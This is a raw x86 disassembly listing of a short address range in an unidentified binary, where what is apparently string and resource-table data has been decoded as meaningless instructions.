  410806:	cmp    DWORD PTR [ecx+0x41],edx
  410809:	add    BYTE PTR [edx+0x54],cl
  41080c:	xor    bl,BYTE PTR [edi+0x50]
  41080f:	push   ebx
  410810:	push   esi
  410811:	inc    esp
  410812:	pop    edi
  410813:	push   edx
  410814:	xor    BYTE PTR [ecx+0x0],bl
  410817:	push   esi
  410818:	inc    esp
  410819:	push   esp
  41081a:	pop    edi
  41081b:	dec    esp
  41081c:	xor    al,0x33
  41081e:	cmp    DWORD PTR [eax+eax*1+0x59],edx
  410822:	inc    edi
  410823:	inc    ebp
  410824:	pop    edi
  410825:	push   ebp
  410826:	pop    edx
  410827:	push   eax
  410828:	dec    edi
  410829:	pop    edi
  41082a:	push   esi
  41082b:	xor    BYTE PTR [eax],al
  41082d:	pop    eax
  41082e:	push   edi
  41082f:	push   esi
  410830:	cmp    BYTE PTR [edi+0x47],bl
  410833:	dec    ecx
  410834:	push   esp
  410835:	push   edx
  410836:	dec    ebx
  410837:	xor    BYTE PTR [edi+0x0],cl
  41083a:	dec    ecx
  41083b:	dec    esi
  41083c:	xor    eax,0x33345f30
  410841:	push   eax
  410842:	dec    edx
  410843:	cmp    BYTE PTR [eax],al
  410845:	pop    eax
  410846:	inc    ecx
  410847:	dec    esi
  410848:	pop    edi
  410849:	inc    edx
  41084a:	push   ebp
  41084b:	push   ecx
  41084c:	pop    edi
  41084d:	inc    ecx
  41084e:	add    BYTE PTR [edi+0x58],al
  410851:	xor    BYTE PTR [edi+0x4c],bl
  410854:	dec    ebp
  410855:	cmp    DWORD PTR [ebp+0x5f],edx
  410858:	push   esp
  410859:	push   edx
  41085a:	add    BYTE PTR [eax+0x38],cl
  41085d:	dec    edi
  41085e:	xor    eax,0x594b535f
  410863:	xor    BYTE PTR [ebp+0x0],cl
  410866:	inc    ecx
  410867:	dec    eax
  410868:	xor    DWORD PTR [edi+0x4e],ebx
  41086b:	ss inc esp
  41086d:	dec    eax
  41086e:	cmp    DWORD PTR [eax],eax
  410870:	push   esi
  410871:	push   esp
  410872:	aaa    
  410873:	xor    bh,BYTE PTR [ecx]
  410875:	xor    al,0x31
  410877:	pop    edi
  410878:	push   edx
  410879:	push   edi
  41087a:	push   edx
  41087b:	dec    ecx
  41087c:	pop    edi
  41087d:	inc    esp
  41087e:	add    BYTE PTR [edi+0x52],dl
  410881:	pop    ecx
  410882:	xor    eax,0x5045395f
  410887:	pop    edi
  410888:	xor    eax,DWORD PTR [eax]
  41088a:	inc    ebp
  41088b:	xor    dl,BYTE PTR [ebx+0x39]
  41088e:	xor    dh,BYTE PTR [esi]
  410890:	xor    eax,0x4900525f
  410895:	push   esp
  410896:	xor    bl,BYTE PTR [edi+0x41]
  410899:	dec    edx
  41089a:	xor    eax,0x4c3737
  41089f:	push   ecx
  4108a0:	add    BYTE PTR [edi+0x0],al
  4108a3:	pop    ecx
  4108a4:	add    BYTE PTR [edi+0x0],bl
  4108a7:	push   ebx
  4108a8:	add    BYTE PTR [ebx+0x0],al
  4108ab:	xor    al,BYTE PTR [eax]
  4108ad:	pop    edx
  4108ae:	add    BYTE PTR [edi+0x0],dl
  4108b1:	add    BYTE PTR [eax],al
  4108b3:	push   edx
  4108b4:	add    BYTE PTR [eax+eax*1+0x4d],dl
  4108b8:	add    BYTE PTR [edi+0x0],bl
  4108bb:	dec    eax
  4108bc:	add    BYTE PTR [ebx+0x0],cl
  4108bf:	xor    DWORD PTR [eax],eax
  4108c1:	pop    edi
  4108c2:	add    BYTE PTR [ecx+0x0],al
  4108c5:	push   ebp
  4108c6:	add    BYTE PTR [ecx],bh
  4108c8:	add    BYTE PTR [esi+0x0],dl
  4108cb:	xor    al,BYTE PTR [eax]
  4108cd:	pop    edi
  4108ce:	add    BYTE PTR [edx],dh
  4108d0:	add    BYTE PTR [eax],al
  4108d2:	add    BYTE PTR [ecx+0x0],dl
  4108d5:	xor    al,0x0
  4108d7:	inc    edx
  4108d8:	add    BYTE PTR [edi+0x0],bl
  4108db:	inc    esp
  4108dc:	add    BYTE PTR [esi+0x0],dl
  4108df:	xor    eax,0x5f005500
  4108e4:	add    BYTE PTR [ebx+0x0],al
  4108e7:	inc    ebx
  4108e8:	add    BYTE PTR [eax],al
  4108ea:	add    BYTE PTR [eax+0x0],cl
  4108ed:	inc    edx
  4108ee:	add    BYTE PTR [ecx+0x0],dl
  4108f1:	pop    edi
  4108f2:	add    BYTE PTR [eax+eax*1+0x38],dl
  4108f6:	add    BYTE PTR [eax+0x0],dl
  4108f9:	push   edx
  4108fa:	add    BYTE PTR [ecx+0x0],cl
  4108fd:	pop    edi
  4108fe:	add    BYTE PTR [ebp+0x0],al
  410901:	dec    ebp
  410902:	add    BYTE PTR [ebp+0x0],dl
  410905:	add    BYTE PTR [eax],al
  410907:	inc    edi
  410908:	add    BYTE PTR [edi+0x0],cl
  41090b:	xor    eax,0x32005f00
  410910:	add    BYTE PTR [ebx+0x0],dl
  410913:	inc    ebp
  410914:	add    BYTE PTR [ecx],bh
  410916:	add    BYTE PTR [esi],dh
  410918:	add    BYTE PTR [edi+0x0],bl
  41091b:	pop    eax
  41091c:	add    BYTE PTR [edx+0x0],bl
  41091f:	xor    al,0x0
  410921:	pop    edi
  410922:	add    BYTE PTR [edi+0x0],cl
  410925:	add    BYTE PTR [eax],al
  410927:	push   ebx
  410928:	add    BYTE PTR [eax],dh
  41092a:	add    BYTE PTR [ecx+0x0],dl
  41092d:	pop    edi
  41092e:	add    BYTE PTR [ebp+0x0],dl
  410931:	dec    ecx
  410932:	add    BYTE PTR [ecx+0x0],bl
  410935:	xor    al,BYTE PTR [eax]
  410937:	add    BYTE PTR [eax],al
  410939:	dec    eax
  41093a:	add    BYTE PTR [edi],dh
  41093c:	add    BYTE PTR [ecx+0x0],bl
  41093f:	aaa    
  410940:	add    BYTE PTR [edi+0x0],bl
  410943:	inc    esi
  410944:	add    BYTE PTR [edi],dh
  410946:	add    BYTE PTR [ecx+0x0],bl
  410949:	inc    esp
  41094a:	add    BYTE PTR [edi+0x0],bl
  41094d:	xor    eax,0x52000000
  410952:	add    BYTE PTR [eax+0x0],dl
  410955:	inc    esi
  410956:	add    BYTE PTR [edi+0x0],bl
  410959:	dec    esp
  41095a:	add    BYTE PTR [ecx+0x0],al
  41095d:	push   eax
  41095e:	add    BYTE PTR [edi+0x0],bl
  410961:	inc    ecx
  410962:	add    BYTE PTR [edi],dh
  410964:	add    BYTE PTR [eax+eax*1+0x4a],al
  410968:	add    BYTE PTR [ebp+0x0],al
  41096b:	pop    edi
  41096c:	add    BYTE PTR [eax+eax*1],dh
  41096f:	add    BYTE PTR [eax],al
  410971:	dec    esp
  410972:	add    BYTE PTR [edi],dh
  410974:	add    BYTE PTR [ebp+0x0],cl
  410977:	cmp    BYTE PTR [eax],al
  410979:	xor    al,BYTE PTR [eax]
  41097b:	pop    edi
  41097c:	add    BYTE PTR [eax],bh
  41097e:	add    BYTE PTR [ecx+0x0],al
  410981:	pop    edx
  410982:	add    BYTE PTR [edx+0x0],bl
  410985:	pop    edi
  410986:	add    BYTE PTR [ebx],dh
  410988:	add    BYTE PTR [ebx+0x0],dl
  41098b:	add    BYTE PTR [eax],al
  41098d:	push   esi
  41098e:	add    BYTE PTR [eax],bh
  410990:	add    BYTE PTR [esi+0x0],dl
  410993:	xor    al,BYTE PTR [eax]
  410995:	pop    edi
  410996:	add    BYTE PTR [esi+0x0],al
  410999:	inc    ebx
  41099a:	add    BYTE PTR [edi+0x0],al
  41099d:	push   edi
  41099e:	add    BYTE PTR [edi+0x0],bl
  4109a1:	dec    eax
  4109a2:	add    BYTE PTR [edx+0x0],cl
  4109a5:	cmp    DWORD PTR [eax],eax
  4109a7:	aaa    
  4109a8:	add    BYTE PTR [eax],al
  4109aa:	add    BYTE PTR [ecx+0x0],cl
  4109ad:	dec    edx
  4109ae:	add    BYTE PTR [ecx+0x0],al
  4109b1:	pop    edi
  4109b2:	add    BYTE PTR [edx+0x0],cl
  4109b5:	inc    esi
  4109b6:	add    BYTE PTR [edi+0x0],dl
  4109b9:	xor    eax,DWORD PTR [eax]
  4109bb:	dec    ebp
  4109bc:	add    BYTE PTR [edi+0x0],bl
  4109bf:	push   eax
  4109c0:	add    BYTE PTR [ecx+0x0],al
  4109c3:	add    BYTE PTR [eax],al
  4109c5:	dec    edi
  4109c6:	add    BYTE PTR [ecx+0x0],bl
  4109c9:	dec    eax
  4109ca:	add    BYTE PTR [edi+0x0],bl
  4109cd:	xor    eax,0x0
	...
  4109da:	add    al,0x0
  4109dc:	add    BYTE PTR [eax],al
  4109de:	push   cs
  4109df:	add    BYTE PTR [eax],al
  4109e1:	add    BYTE PTR [eax],al
  4109e3:	pop    es
  4109e4:	add    BYTE PTR [eax-0x7fffff80],al
  4109ea:	cs pop es
  4109ec:	add    BYTE PTR [eax-0x7fffff68],al
  4109f2:	test   al,0x7
  4109f4:	add    BYTE PTR [eax-0x7fffff30],al
  4109fa:	rol    BYTE PTR [edi],cl
  4109fc:	add    BYTE PTR [eax-0x7fffff18],al
  410a02:	add    al,0x8
  410a04:	add    BYTE PTR [eax-0x7ffffef0],al
  410a0a:	xor    BYTE PTR [eax],cl
  410a0c:	add    BYTE PTR [eax-0x7ffffed8],al
  410a12:	pusha  
  410a13:	or     BYTE PTR [eax],al
  410a15:	adc    BYTE PTR [eax+0x1],0x0
  410a19:	cmp    BYTE PTR [edx+0x8],0x0
  410a1d:	sub    BYTE PTR [eax+0x1],0x0
  410a21:	adc    dh,0x8
  410a24:	add    BYTE PTR [eax-0x7ffffe60],al
  410a2a:	call   0xb8c10a37
  410a2f:	add    DWORD PTR [eax],eax
  410a31:	sbb    BYTE PTR [eax],0x9
  410a34:	add    BYTE PTR [eax-0x7ffffe28],al
  410a3a:	dec    eax
  410a3b:	or     DWORD PTR [eax],eax
  410a3d:	add    BYTE PTR [eax],0x2
  410a40:	add    BYTE PTR [eax-0x7ffff67e],al
  410a46:	sbb    BYTE PTR [edx],al
  410a48:	add    BYTE PTR [eax-0x7ffff64e],al
  410a4e:	cmp    BYTE PTR [edx],al
  410a50:	add    BYTE PTR [eax+0x0],al
  410a56:	add    BYTE PTR [eax],al
  410a58:	add    BYTE PTR [eax],al
  410a5a:	add    al,0x0
  410a5c:	add    BYTE PTR [eax],al
  410a5e:	add    DWORD PTR [eax],eax
  410a60:	add    BYTE PTR [eax],al
  410a62:	sbb    al,0x7
  410a64:	add    BYTE PTR [eax-0x7ffffdb0],al
	...
  410a72:	add    al,0x0
  410a74:	add    BYTE PTR [eax],al
  410a76:	add    al,0x0
  410a78:	add    DWORD PTR [eax],eax
  410a7a:	dec    esi
  410a7b:	pop    es
  410a7c:	add    BYTE PTR [eax-0x7ffffd98],al
  410a82:	bound  eax,QWORD PTR [edi]
  410a84:	add    BYTE PTR [eax-0x7ffffd80],al
  410a8a:	jp     0x410a93
  410a8c:	add    BYTE PTR [eax-0x7ffffd68],al
  410a92:	mov    es,WORD PTR [edi]
  410a94:	add    BYTE PTR [eax-0x7ffffd50],al
  410a9a:	and    DWORD PTR [edx+0x0],0x0
  410a9e:	enter  0x2,0x80
	...
  410aaa:	add    al,0x0
  410aac:	add    BYTE PTR [eax],al
  410aae:	add    DWORD PTR [eax],eax
  410ab0:	add    BYTE PTR [eax],al
  410ab2:	mov    edx,0xe0800007
  410ab7:	add    al,BYTE PTR [eax]
  410ab9:	add    BYTE PTR [eax],0x0
  410abc:	add    BYTE PTR [eax],al
  410abe:	add    BYTE PTR [eax],al
  410ac0:	add    BYTE PTR [eax],al
  410ac2:	add    al,0x0
  410ac4:	add    BYTE PTR [eax],al
  410ac6:	add    DWORD PTR [eax],eax
  410ac8:	add    al,BYTE PTR [eax]
  410aca:	repnz pop es
  410acc:	add    BYTE PTR [eax-0x7ffffd08],al
  410ad2:	fstp   QWORD PTR [esi]
  410ad4:	add    BYTE PTR [eax],al
  410ad6:	adc    BYTE PTR [ebx],al
  410ad8:	add    BYTE PTR [eax+0x2c95],al
  410ade:	sub    BYTE PTR [ebx],al
  410ae0:	add    BYTE PTR [eax+0x0],al
  410ae6:	add    BYTE PTR [eax],al
  410ae8:	add    BYTE PTR [eax],al
  410aea:	add    al,0x0
  410aec:	add    BYTE PTR [eax],al
  410aee:	add    DWORD PTR [eax],eax
  410af0:	add    BYTE PTR [eax],al
  410af2:	push   ds
  410af3:	or     BYTE PTR [eax],al
  410af5:	add    BYTE PTR [eax+0x3],0x0
  410af9:	add    BYTE PTR [eax],0x0
  410afc:	add    BYTE PTR [eax],al
  410afe:	add    BYTE PTR [eax],al
  410b00:	add    BYTE PTR [eax],al
  410b02:	add    al,0x0
  410b04:	add    BYTE PTR [eax],al
  410b06:	add    DWORD PTR [eax],eax
  410b08:	add    al,BYTE PTR [eax]
  410b0a:	dec    esi
  410b0b:	or     BYTE PTR [eax],al
  410b0d:	sbb    BYTE PTR [eax+0x3],0x0
  410b11:	sub    BYTE PTR [ecx+edx*1+0x0],0x0
  410b16:	jo     0x410b1b
  410b18:	add    BYTE PTR [eax+0x24ad],al
  410b1e:	mov    BYTE PTR [ebx],al
  410b20:	add    BYTE PTR [eax+0x0],al
  410b26:	add    BYTE PTR [eax],al
  410b28:	add    BYTE PTR [eax],al
  410b2a:	add    al,0x0
  410b2c:	add    BYTE PTR [eax],al
  410b2e:	add    BYTE PTR [eax],al
  410b30:	add    DWORD PTR [eax],eax
  410b32:	jg     0x410b43
  410b34:	add    BYTE PTR [eax],al
  410b36:	mov    al,ds:0x800003
  410b3b:	add    BYTE PTR [eax],al
  410b3d:	add    BYTE PTR [eax],al
  410b3f:	add    BYTE PTR [eax],al
  410b41:	add    BYTE PTR [eax+eax*1],al
  410b44:	add    BYTE PTR [eax],al
  410b46:	add    eax,DWORD PTR [eax]
  410b48:	add    al,BYTE PTR [eax]
  410b4a:	nop
  410b4b:	or     BYTE PTR [eax],al
  410b4d:	cmp    BYTE PTR [eax-0x537ffffd],0x8
  410b54:	add    BYTE PTR [eax-0x7ffffc30],al
  410b5a:	mov    esi,0xe8800008
  410b5f:	add    eax,DWORD PTR [eax]
  410b61:	xor    bh,0x3
  410b64:	add    BYTE PTR [eax],al
  410b66:	add    BYTE PTR [eax+eax*1],al
  410b69:	or     BYTE PTR [esi+0x18000018],0x4
  410b70:	add    BYTE PTR [eax+0x0],al
  410b76:	add    BYTE PTR [eax],al
  410b78:	add    BYTE PTR [eax],al
  410b7a:	add    al,0x0
  410b7c:	add    BYTE PTR [eax],al
  410b7e:	add    BYTE PTR [eax],al
  410b80:	add    DWORD PTR [eax],eax
  410b82:	mov    esp,0x30000047
  410b87:	add    al,0x0
  410b89:	add    BYTE PTR [eax],0x0
  410b8c:	add    BYTE PTR [eax],al
  410b8e:	add    BYTE PTR [eax],al
  410b90:	add    BYTE PTR [eax],al
  410b92:	add    al,0x0
  410b94:	add    BYTE PTR [eax],al
  410b96:	add    DWORD PTR [eax],eax
  410b98:	add    DWORD PTR [eax],eax
  410b9a:	add    cl,BYTE PTR [ecx]
  410b9c:	add    BYTE PTR [eax-0x7ffffbb8],al
  410ba2:	shr    BYTE PTR [edi+0x0],cl
  410ba5:	add    BYTE PTR [eax+0x4],ah
  410ba8:	add    BYTE PTR [eax+0x0],al
  410bae:	add    BYTE PTR [eax],al
  410bb0:	add    BYTE PTR [eax],al
  410bb2:	add    al,0x0
  410bb4:	add    BYTE PTR [eax],al
  410bb6:	add    DWORD PTR [eax],eax
  410bb8:	add    al,BYTE PTR [eax]
  410bba:	xor    al,0x9
  410bbc:	add    BYTE PTR [eax-0x7ffffb88],al
  410bc2:	mov    ds:0x90000012,eax
  410bc7:	add    al,0x0
  410bc9:	and    BYTE PTR [edx],0x7b
  410bcc:	add    BYTE PTR [eax],al
  410bce:	test   al,0x4
  410bd0:	add    BYTE PTR [eax+0x0],al
  410bd6:	add    BYTE PTR [eax],al
  410bd8:	add    BYTE PTR [eax],al
  410bda:	add    al,0x0
  410bdc:	add    BYTE PTR [eax],al
  410bde:	add    DWORD PTR [eax],eax
  410be0:	add    BYTE PTR [eax],al
  410be2:	or     DWORD PTR fs:[eax],eax
  410be5:	add    al,0x4
  410be8:	add    BYTE PTR [eax+0x0],al
  410bee:	add    BYTE PTR [eax],al
  410bf0:	add    BYTE PTR [eax],al
  410bf2:	add    al,0x0
  410bf4:	add    BYTE PTR [eax],al
  410bf6:	add    DWORD PTR [eax],eax
  410bf8:	add    DWORD PTR [eax],eax
  410bfa:	xchg   esp,eax
  410bfb:	or     DWORD PTR [eax],eax
  410bfd:	sbb    al,0x4
  410c00:	add    BYTE PTR [eax+0x7254],al
  410c06:	lock add al,0x0
  410c09:	add    BYTE PTR [eax],0x0
  410c0c:	add    BYTE PTR [eax],al
  410c0e:	add    BYTE PTR [eax],al
  410c10:	add    BYTE PTR [eax],al
  410c12:	add    al,0x0
  410c14:	add    BYTE PTR [eax],al
  410c16:	add    DWORD PTR [eax],eax
  410c18:	add    BYTE PTR [eax],al
  410c1a:	int3   
  410c1b:	or     DWORD PTR [eax],eax
  410c1d:	or     BYTE PTR [eax],0x5
  410c20:	add    BYTE PTR [eax+0x0],al
  410c26:	add    BYTE PTR [eax],al
  410c28:	add    BYTE PTR [eax],al
  410c2a:	add    al,0x0
  410c2c:	add    BYTE PTR [eax],al
  410c2e:	add    BYTE PTR [eax],al
  410c30:	add    DWORD PTR [eax],eax
  410c32:	or     DWORD PTR [eax+eax*1],eax
  410c35:	add    BYTE PTR [eax],ah
  410c37:	add    eax,0x0
  410c3c:	add    BYTE PTR [eax],al
  410c3e:	add    BYTE PTR [eax],al
  410c40:	add    BYTE PTR [eax],al
  410c42:	add    al,0x0
  410c44:	add    BYTE PTR [eax],al
  410c46:	add    BYTE PTR [eax],al
  410c48:	add    DWORD PTR [eax],eax
  410c4a:	or     DWORD PTR [eax+eax*1],eax
  410c4d:	add    BYTE PTR [eax],dh
  410c4f:	add    eax,0x0
  410c54:	add    BYTE PTR [eax],al
  410c56:	add    BYTE PTR [eax],al
  410c58:	add    BYTE PTR [eax],al
  410c5a:	add    al,0x0
  410c5c:	add    BYTE PTR [eax],al
  410c5e:	add    BYTE PTR [eax],al
  410c60:	add    DWORD PTR [eax],eax
  410c62:	or     DWORD PTR [eax+eax*1],eax
  410c65:	add    BYTE PTR [eax+0x5],al
	...
  410c70:	add    BYTE PTR [eax],al
  410c72:	add    al,0x0
  410c74:	add    BYTE PTR [eax],al
  410c76:	add    BYTE PTR [eax],al
  410c78:	add    DWORD PTR [eax],eax
  410c7a:	or     DWORD PTR [eax+eax*1],eax
  410c7d:	add    BYTE PTR [eax+0x5],dl
	...
  410c88:	add    BYTE PTR [eax],al
  410c8a:	add    al,0x0
  410c8c:	add    BYTE PTR [eax],al
  410c8e:	add    BYTE PTR [eax],al
  410c90:	add    DWORD PTR [eax],eax
  410c92:	or     DWORD PTR [eax+eax*1],eax
  410c95:	add    BYTE PTR [eax+0x5],ah
	...
  410ca0:	add    BYTE PTR [eax],al
  410ca2:	add    al,0x0
  410ca4:	add    BYTE PTR [eax],al
  410ca6:	add    BYTE PTR [eax],al
  410ca8:	add    DWORD PTR [eax],eax
  410caa:	or     DWORD PTR [eax+eax*1],eax
  410cad:	add    BYTE PTR [eax+0x5],dh
	...
  410cb8:	add    BYTE PTR [eax],al
  410cba:	add    al,0x0
  410cbc:	add    BYTE PTR [eax],al
  410cbe:	add    BYTE PTR [eax],al
  410cc0:	add    DWORD PTR [eax],eax
  410cc2:	or     DWORD PTR [eax+eax*1],eax
  410cc5:	add    BYTE PTR [eax+0x5],al
  410ccb:	add    BYTE PTR [eax],al
  410ccd:	add    BYTE PTR [eax],al
  410ccf:	add    BYTE PTR [eax],al
  410cd1:	add    BYTE PTR [eax+eax*1],al
  410cd4:	add    BYTE PTR [eax],al
  410cd6:	add    BYTE PTR [eax],al
  410cd8:	add    DWORD PTR [eax],eax
  410cda:	or     DWORD PTR [eax+eax*1],eax
  410cdd:	add    BYTE PTR [eax+0x5],dl
  410ce3:	add    BYTE PTR [eax],al
  410ce5:	add    BYTE PTR [eax],al
  410ce7:	add    BYTE PTR [eax],al
  410ce9:	add    BYTE PTR [eax+eax*1],al
  410cec:	add    BYTE PTR [eax],al
  410cee:	add    BYTE PTR [eax],al
  410cf0:	add    DWORD PTR [eax],eax
  410cf2:	or     DWORD PTR [eax+eax*1],eax
  410cf5:	add    BYTE PTR [eax+0x5],ah
  410cfb:	add    BYTE PTR [eax],al
  410cfd:	add    BYTE PTR [eax],al
  410cff:	add    BYTE PTR [eax],al
  410d01:	add    BYTE PTR [eax+eax*1],al
  410d04:	add    BYTE PTR [eax],al
  410d06:	add    BYTE PTR [eax],al
  410d08:	add    DWORD PTR [eax],eax
  410d0a:	or     DWORD PTR [eax+eax*1],eax
  410d0d:	add    BYTE PTR [eax+0x5],dh
  410d13:	add    BYTE PTR [eax],al
  410d15:	add    BYTE PTR [eax],al
  410d17:	add    BYTE PTR [eax],al
  410d19:	add    BYTE PTR [eax+eax*1],al
  410d1c:	add    BYTE PTR [eax],al
  410d1e:	add    BYTE PTR [eax],al
  410d20:	add    DWORD PTR [eax],eax
  410d22:	or     DWORD PTR [eax+eax*1],eax
  410d25:	add    al,al
  410d27:	add    eax,0x0
  410d2c:	add    BYTE PTR [eax],al
  410d2e:	add    BYTE PTR [eax],al
  410d30:	add    BYTE PTR [eax],al
  410d32:	add    al,0x0
  410d34:	add    BYTE PTR [eax],al
  410d36:	add    BYTE PTR [eax],al
  410d38:	add    DWORD PTR [eax],eax
  410d3a:	or     DWORD PTR [eax+eax*1],eax
  410d3d:	add    al,dl
  410d3f:	add    eax,0x0
  410d44:	add    BYTE PTR [eax],al
  410d46:	add    BYTE PTR [eax],al
  410d48:	add    BYTE PTR [eax],al
  410d4a:	add    al,0x0
  410d4c:	add    BYTE PTR [eax],al
  410d4e:	add    BYTE PTR [eax],al
  410d50:	add    DWORD PTR [eax],eax
  410d52:	or     DWORD PTR [eax+eax*1],eax
  410d55:	add    al,ah
  410d57:	add    eax,0x0
  410d5c:	add    BYTE PTR [eax],al
  410d5e:	add    BYTE PTR [eax],al
  410d60:	add    BYTE PTR [eax],al
  410d62:	add    al,0x0
  410d64:	add    BYTE PTR [eax],al
  410d66:	add    BYTE PTR [eax],al
  410d68:	add    DWORD PTR [eax],eax
  410d6a:	or     DWORD PTR [eax+eax*1],eax
  410d6d:	add    al,dh
  410d6f:	add    eax,0x0
  410d74:	add    BYTE PTR [eax],al
  410d76:	add    BYTE PTR [eax],al
  410d78:	add    BYTE PTR [eax],al
  410d7a:	add    al,0x0
  410d7c:	add    BYTE PTR [eax],al
  410d7e:	add    BYTE PTR [eax],al
  410d80:	add    DWORD PTR [eax],eax
  410d82:	or     DWORD PTR [eax+eax*1],eax
  410d85:	add    BYTE PTR [eax],al
  410d87:	push   es
	...
  410d90:	add    BYTE PTR [eax],al
  410d92:	add    al,0x0
  410d94:	add    BYTE PTR [eax],al
  410d96:	add    BYTE PTR [eax],al
  410d98:	add    DWORD PTR [eax],eax
  410d9a:	or     DWORD PTR [eax+eax*1],eax
  410d9d:	add    BYTE PTR [eax],dl
  410d9f:	push   es
	...
  410da8:	add    BYTE PTR [eax],al
  410daa:	add    al,0x0
  410dac:	add    BYTE PTR [eax],al
  410dae:	add    BYTE PTR [eax],al
  410db0:	add    DWORD PTR [eax],eax
  410db2:	or     DWORD PTR [eax+eax*1],eax
  410db5:	add    BYTE PTR [eax],ah
  410db7:	push   es
	...
  410dc0:	add    BYTE PTR [eax],al
  410dc2:	add    al,0x0
  410dc4:	add    BYTE PTR [eax],al
  410dc6:	add    BYTE PTR [eax],al
  410dc8:	add    DWORD PTR [eax],eax
  410dca:	or     DWORD PTR [eax+eax*1],eax
  410dcd:	add    BYTE PTR [eax],dh
  410dcf:	push   es
	...
  410dd8:	add    BYTE PTR [eax],al
  410dda:	add    al,0x0
  410ddc:	add    BYTE PTR [eax],al
  410dde:	add    BYTE PTR [eax],al
  410de0:	add    DWORD PTR [eax],eax
  410de2:	or     DWORD PTR [eax+eax*1],eax
  410de5:	add    BYTE PTR [eax+0x6],al
	...
  410df0:	add    BYTE PTR [eax],al
  410df2:	add    al,0x0
  410df4:	add    BYTE PTR [eax],al
  410df6:	add    BYTE PTR [eax],al
  410df8:	add    DWORD PTR [eax],eax
  410dfa:	or     DWORD PTR [eax+eax*1],eax
  410dfd:	add    BYTE PTR [eax+0x6],dl
	...
  410e08:	add    BYTE PTR [eax],al
  410e0a:	add    al,0x0
  410e0c:	add    BYTE PTR [eax],al
  410e0e:	add    BYTE PTR [eax],al
  410e10:	add    DWORD PTR [eax],eax
  410e12:	or     DWORD PTR [eax+eax*1],eax
  410e15:	add    BYTE PTR [eax+0x6],ah
	...
  410e20:	add    BYTE PTR [eax],al
  410e22:	add    al,0x0
  410e24:	add    BYTE PTR [eax],al
  410e26:	add    BYTE PTR [eax],al
  410e28:	add    DWORD PTR [eax],eax
  410e2a:	or     DWORD PTR [eax+eax*1],eax
  410e2d:	add    BYTE PTR [eax+0x6],dh
	...
  410e38:	add    BYTE PTR [eax],al
  410e3a:	add    al,0x0
  410e3c:	add    BYTE PTR [eax],al
  410e3e:	add    BYTE PTR [eax],al
  410e40:	add    DWORD PTR [eax],eax
  410e42:	or     DWORD PTR [eax+eax*1],eax
  410e45:	add    BYTE PTR [eax+0x6],al
  410e4b:	add    BYTE PTR [eax],al
  410e4d:	add    BYTE PTR [eax],al
  410e4f:	add    BYTE PTR [eax],al
  410e51:	add    BYTE PTR [eax+eax*1],al
  410e54:	add    BYTE PTR [eax],al
  410e56:	add    BYTE PTR [eax],al
  410e58:	add    DWORD PTR [eax],eax
  410e5a:	or     DWORD PTR [eax+eax*1],eax
  410e5d:	add    BYTE PTR [eax+0x6],dl
  410e63:	add    BYTE PTR [eax],al
  410e65:	add    BYTE PTR [eax],al
  410e67:	add    BYTE PTR [eax],al
  410e69:	add    BYTE PTR [eax+eax*1],al
  410e6c:	add    BYTE PTR [eax],al
  410e6e:	add    BYTE PTR [eax],al
  410e70:	add    DWORD PTR [eax],eax
  410e72:	or     DWORD PTR [eax+eax*1],eax
  410e75:	add    BYTE PTR [eax+0x6],ah
  410e7b:	add    BYTE PTR [eax],al
  410e7d:	add    BYTE PTR [eax],al
  410e7f:	add    BYTE PTR [eax],al
  410e81:	add    BYTE PTR [eax+eax*1],al
  410e84:	add    BYTE PTR [eax],al
  410e86:	add    BYTE PTR [eax],al
  410e88:	add    DWORD PTR [eax],eax
  410e8a:	or     DWORD PTR [eax+eax*1],eax
  410e8d:	add    BYTE PTR [eax+0x6],dh
  410e93:	add    BYTE PTR [eax],al
  410e95:	add    BYTE PTR [eax],al
  410e97:	add    BYTE PTR [eax],al
  410e99:	add    BYTE PTR [eax+eax*1],al
  410e9c:	add    BYTE PTR [eax],al
  410e9e:	add    BYTE PTR [eax],al
  410ea0:	add    DWORD PTR [eax],eax
  410ea2:	or     DWORD PTR [eax+eax*1],eax
  410ea5:	add    al,al
  410ea7:	push   es
	...
  410eb0:	add    BYTE PTR [eax],al
  410eb2:	add    al,0x0
  410eb4:	add    BYTE PTR [eax],al
  410eb6:	add    BYTE PTR [eax],al
  410eb8:	add    DWORD PTR [eax],eax
  410eba:	or     DWORD PTR [eax+eax*1],eax
  410ebd:	add    al,dl
  410ebf:	push   es
	...
  410ec8:	add    BYTE PTR [eax],al
  410eca:	add    al,0x0
  410ecc:	add    BYTE PTR [eax],al
  410ece:	add    BYTE PTR [eax],al
  410ed0:	add    DWORD PTR [eax],eax
  410ed2:	or     DWORD PTR [eax+eax*1],eax
  410ed5:	add    al,ah
  410ed7:	push   es
	...
  410ee0:	add    BYTE PTR [eax],al
  410ee2:	add    al,0x0
  410ee4:	add    BYTE PTR [eax],al
  410ee6:	add    BYTE PTR [eax],al
  410ee8:	add    DWORD PTR [eax],eax
  410eea:	or     DWORD PTR [eax+eax*1],eax
  410eed:	add    al,dh
  410eef:	push   es
  410ef0:	add    BYTE PTR [eax],al
  410ef2:	ret    0x113
  410ef5:	add    BYTE PTR [esi],cl
  410ef7:	or     DWORD PTR [eax],eax
  410ef9:	add    ah,ah
  410efb:	add    al,0x0
  410efd:	add    BYTE PTR [eax],al
  410eff:	add    BYTE PTR [eax],al
  410f01:	add    al,dl
  410f03:	sbb    al,0x1
  410f05:	add    BYTE PTR [esi],cl
  410f07:	or     DWORD PTR [eax],eax
  410f09:	add    ah,ah
  410f0b:	add    al,0x0
  410f0d:	add    BYTE PTR [eax],al
  410f0f:	add    BYTE PTR [eax],al
  410f11:	add    dh,bl
  410f13:	and    eax,0x9020001
  410f18:	add    BYTE PTR [eax],al
  410f1a:	in     al,0x4
  410f1c:	add    BYTE PTR [eax],al
  410f1e:	add    BYTE PTR [eax],al
  410f20:	add    BYTE PTR [eax],al
  410f22:	loopne 0x410f52
  410f24:	add    DWORD PTR [eax],eax
  410f26:	push   es
  410f27:	or     DWORD PTR [eax],eax
  410f29:	add    ah,ah
  410f2b:	add    al,0x0
  410f2d:	add    BYTE PTR [eax],al
  410f2f:	add    BYTE PTR [eax],al
  410f31:	add    dh,ah
  410f33:	aaa    
  410f34:	add    DWORD PTR [eax],eax
  410f36:	push   cs
  410f37:	or     DWORD PTR [eax],eax
  410f39:	add    ah,ah
  410f3b:	add    al,0x0
  410f3d:	add    BYTE PTR [eax],al
  410f3f:	add    BYTE PTR [eax],al
  410f41:	add    ah,dh
  410f43:	inc    eax
  410f44:	add    DWORD PTR [eax],eax
  410f46:	add    cl,BYTE PTR [ecx]
  410f48:	add    BYTE PTR [eax],al
  410f4a:	in     al,0x4
  410f4c:	add    BYTE PTR [eax],al
  410f4e:	add    BYTE PTR [eax],al
